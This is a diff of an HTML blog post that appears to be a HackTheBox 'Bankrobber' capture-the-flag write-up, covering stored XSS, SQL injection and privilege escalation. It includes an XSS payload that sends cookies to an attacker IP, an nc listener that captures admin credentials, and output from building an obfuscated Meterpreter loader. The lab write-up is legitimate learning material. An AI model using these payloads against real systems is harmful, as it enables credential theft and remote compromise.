@@ -43,7 +43,7 @@
 <meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-rooted!.png">
 <meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-root.png">
 <meta property="article:published_time" content="2020-02-20T10:35:26.000Z">
-<meta property="article:modified_time" content="2020-03-08T19:07:00.950Z">
+<meta property="article:modified_time" content="2020-03-08T19:13:39.308Z">
 <meta property="article:author" content="medz">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="pentest">
@@ -264,9 +264,9 @@
 <p>It looks like the admin is checking each transfer transaction, so I intercept it with <a href="https://portswigger.net/burp" target="_blank" rel="noopener">BurpSuite</a> (A Web Penetration Testing tool)</p>
 <p><img src="/img/bank/bank-burp1.png" alt="HackTheBox-Bankrobber/bank-burp1.png" title="Bank burp1"></p>
 <p>Using this payload from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" target="_blank" rel="noopener">PayloadAllTheThings</a></p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># xss</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">this.src</span>=<span class="string">"http://10.10.15.71/?c="</span>%<span class="attr">2bdocument.cookie</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"># xss</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=<span class="keyword">this</span>.src=<span class="string">"http://10.10.15.71/?c="</span>%<span class="number">2</span>bdocument.cookie&gt;</span><br></pre></td></tr></table></figure>
 
-<p>my user id here is <code>ID #4</code> and my <code>username</code> and <code>password</code> in on <code>base64</code> code format.<br><code>toId=</code> is the id where I transfer my e-coin. I set first my <code>nc</code> listener on port 80 then I modify the response with my payload and send it.</p>
+<p>my user id # here is <code>ID #4</code>, my <code>username</code> and <code>password</code> in on <code>base64</code> code format.<br><code>toId=</code> is the id where I transfer my e-coin. I set first my <code>nc</code> listener on port 80 then I modify the response with my payload and send it.</p>
 <p><img src="/img/bank/bank-burp-send.png" alt="HackTheBox-Bankrobber/bank-burp-send.png" title="Bank burp2"></p>
 <p>after 5-10 minutes of waiting, I’ll get a response in my <code>nc</code> listener and it’s the username and password of the admin in <code>base64</code> code format.<br>Convert it to plaintext and I got now the admin creds.</p>
 <p><img src="/img/bank/bank-admin-creds.png" alt="HackTheBox-Bankrobber/bank-admin-creds.png" title="Bank Admin credentials"></p>
@@ -276,12 +276,13 @@
 <p><img src="/img/bank/bank-notes-web.png" alt="HackTheBox-Bankrobber/bank-notes-web.png" title="Bank Admin page"></p>
 <p>Looking at the notes.</p>
 <p><img src="/img/bank/bank-notes1.png" alt="HackTheBox-Bankrobber/bank-notes1.png" title="Bank Notes"></p>
-<p>I don’t know what that means, but there are two things that I’m sure of.<br>    ⇒ <code>default Xampp</code> folder is in the <code>C:\xampp\htdocs\</code> where you can run a local web server.<br>    ⇒ There’s was a vulnerability in the <code>encode comments</code>. For every IP address.</p>
+<p>I don’t know what that means, but there are two things that I’m sure of.<br>    ⇒ <code>default Xampp</code> installation folder is in the <code>C:\xampp\htdocs\</code> where you can run a local web server.<br>    ⇒ There’s was a vulnerability in the <code>encode comments</code>. For every IP address.</p>
 <p>Next, the two interesting things – <code>Search users</code> and <code>Backdoorchecker</code>.<br>I try to search my <code>ID #</code> in search users (beta) when you say <code>beta</code> it’s not fully functional, there was an existing bugs and errors with that.</p>
 <p><img src="/img/bank/bank-myid.png" alt="HackTheBox-Bankrobber/my-id.png" title="Bank my id#"></p>
 <p><code>Backdoorchecker</code></p>
 <p><img src="/img/bank/bank-backdoorchecker.png" alt="HackTheBox-Bankrobber/bank-backdoorchecker.png" title="Bank Backdoor Checker"></p>
-<pre><code>⇒ Due to recent hacking attemps on the server, Backdoorcheker features is only accessible from the localhost because it returns the following message when I try any commands:</code></pre><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dir</span><br></pre></td></tr></table></figure>
+<p>   ⇒ Due to recent hacking attemps on the server, Backdoorcheker features is only accessible from the localhost because it returns the following message when I try any commands:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dir</span><br></pre></td></tr></table></figure>
 <p>There’s a possibility that this features is vulnerable to <a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">SQLi</a>.</p>
 <h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="XSS-and-SQL-Injection"><a href="#XSS-and-SQL-Injection" class="headerlink" title="XSS and SQL Injection"></a>XSS and SQL Injection</h3><p>I try to intercept the <code>search users</code> function using <a href="https://portswigger.net/burp" target="_blank" rel="noopener">BurpSuite</a> and try SQL Injection.</p>
 <p><img src="/img/bank/bank-sql-injection.png" alt="HackTheBox-Bankrobber/bank-sql-injection.png" title="Bank Backdoor Checker"></p>
@@ -307,8 +308,8 @@
 <p>System Info of Bankrobber<br><img src="/img/bank/bank-winPE.png" alt="HackTheBox-Bankrobber/bank-winPE.png" title="Bank System Info"></p>
 <p>I see something’s odd running on port 910<br><img src="/img/bank/bank-910.png" alt="HackTheBox-Bankrobber/bank-910.png" title="Bank port 910"></p>
 <p>And a suspicious running on the background process named – <code>bankv2.exe</code><br><img src="/img/bank/bank-bankv2.png" alt="HackTheBox-Bankrobber/bank-bankv2.png" title="Bank bankv2"></p>
-<p>so I tunnel my local port 910 in my Kali Linux system to the port 910 of the Bankrobber. To do so I created an obfuscated meterpreter.</p>
-<h3 id="Customizing-custom-Meterpreter-loader"><a href="#Customizing-custom-Meterpreter-loader" class="headerlink" title="Customizing custom Meterpreter loader"></a>Customizing custom Meterpreter loader</h3><p>see this:<br><a href="https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/" target="_blank" rel="noopener">https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/</a></p>
+<h3 id="Customizing-custom-Meterpreter-loader"><a href="#Customizing-custom-Meterpreter-loader" class="headerlink" title="Customizing custom Meterpreter loader"></a>Customizing custom Meterpreter loader</h3><p>so I tunnel my local port 910 in my Kali Linux system to the port 910 of the Bankrobber. To do so I created an obfuscated meterpreter.</p>
+<p>see this:<br><a href="https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/" target="_blank" rel="noopener">https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/</a></p>
 <p>run the bash script and check the payload file</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">****************************************************************</span><br><span class="line">    Automatic C <span class="built_in">source</span> code generator - FOR METASPLOIT          </span><br><span class="line">           Based on rsmudge metasploit-loader                   </span><br><span class="line">****************************************************************</span><br><span class="line">Metasploit server IP : 10.10.15.71</span><br><span class="line">Metasploit port number : 9001</span><br><span class="line">Compiling binary ..</span><br><span class="line">In file included from temp.c:4:</span><br><span class="line">/usr/share/mingw-w64/include/winsock2.h:15:2: warning: <span class="comment">#warning Please include winsock2.h before windows.h [-Wcpp]</span></span><br><span class="line"> <span class="comment">#warning Please include winsock2.h before windows.h</span></span><br><span class="line">  ^~~~~~~</span><br><span class="line">-rwxr-xr-x 1 root root 292503 Mar  8 09:08 payload.exe</span><br></pre></td></tr></table></figure>
 <p><img src="/img/bank/bank-payload.png" alt="HackTheBox-Bankrobber/bank-payload.png" title="Bank digit code"></p>
